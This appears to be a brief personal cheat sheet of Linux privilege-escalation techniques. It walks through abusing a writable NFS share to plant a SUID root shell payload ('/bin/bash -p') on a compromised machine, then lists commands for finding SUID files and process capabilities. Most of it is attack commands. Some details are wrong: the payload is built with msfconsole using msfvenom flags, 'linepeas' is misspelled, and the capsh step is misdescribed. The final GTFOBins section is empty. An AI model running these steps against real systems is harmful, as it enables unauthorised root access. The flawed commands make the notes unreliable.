

---

# Linux Privilege Escalation

## NFS Exploit

To check if the attacker machine mount is possible:
```sh
cat /etc/exports
```

Use Nmap to check the NFS mount:
```sh
nmap --script=nfs-showmount 10.10.x.x
```
*(Note: (sync) means write)*

### To set up the mount point on a local machine and create a temporary directory:

1. On the local machine, create a temporary directory:
    ```sh
    mkdir /tmp/nfs
    ```

2. Mount the NFS share:
    ```sh
    sudo mount -o rw,vers=3 -t nfs 10.10.x.x:/tmp /tmp/nfs
    ```

3. Navigate to the `/tmp` directory.

### Create a Metasploit Linux exploit with SUID bit set:

1. On the local machine with root privileges, generate the exploit:
    ```sh
    msfconsole -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
    ```

2. Give the SUID bit permission to the `shell.elf` file:
    ```sh
    chmod +s /tmp/nfs/shell.elf
    ```

### Execute the `shell.elf` file on the compromised machine:

1. Navigate to the compromised machine and execute the file:
    ```sh
    ./shell.elf
    ```

---

# Exploit Capabilities

## After logging into the compromised machine, check if the capabilities exist:

### Using LinePeas:

To check capabilities:
```sh
./linepeas
```

### Manual Approach:

1. To check the capabilities for SUID bit:
    ```sh
    getcap -r / 2>/dev/null
    ```

2. To find files with SUID bit:
    ```sh
    find / -perm /4000 2>/dev/null
    ```

3. To check the process capabilities:
    ```sh
    ps -aux | grep root
    ```

4. Check any process ID which is running as root:
    ```sh
    cat /proc/477/status | grep -i cap
    ```

5. Convert the hex value to ASCII value:
    ```sh
    capsh --decode=000003ffffffff
    ```

### Use GTFOBins to Exploit:

---

